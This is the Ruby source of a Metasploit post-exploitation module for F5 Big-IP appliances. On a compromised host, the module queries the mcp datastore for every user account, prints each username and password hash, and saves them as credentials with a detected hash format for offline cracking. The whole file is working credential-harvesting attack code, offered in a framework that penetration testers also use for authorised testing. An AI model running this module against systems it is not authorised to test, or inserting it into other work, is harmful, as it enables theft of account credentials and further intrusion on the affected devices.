##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System
  include Msf::Post::Linux::F5

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'F5 Big-IP Gather Users',
      'Description'  => %q{
        This module gathers usernames and password hashes from F5's mcp
        datastore, which is accessed via /var/run/mcp.

        Adapted from:  https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb
      },
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Ron Bowes'
        ],
      'Platform'     => ['linux'],
      'SessionTypes' => ['shell', 'meterpreter']
    ))
  end

  def run
    users = mcp_simple_query('userdb_entry')

    unless users
      print_error('Failed to query users')
      return
    end

    users.each do |u|
      print_good("#{u['userdb_entry_name']} / #{u['userdb_entry_passwd']}")

      # TODO: store loot?
      create_credential(
        jtr_format: Metasploit::Framework::Hashes.identify_hash(u['userdb_entry_passwd']),
        origin_type: :session,
        post_reference_name: self.refname,
        private_type: :nonreplayable_hash,
        private_data: u['userdb_entry_passwd'],
        session_id: session_db_id,
        username: u['userdb_entry_name'],
        workspace_id: myworkspace_id
      )
    end
  end

  # def save(msg, data, ctype = 'text/plain')
  #   ltype = 'linux.enum.users'
  #   loot = store_loot(ltype, ctype, session, data, nil, msg)
  #   print_good("#{msg} stored in #{loot.to_s}")
  # end

end
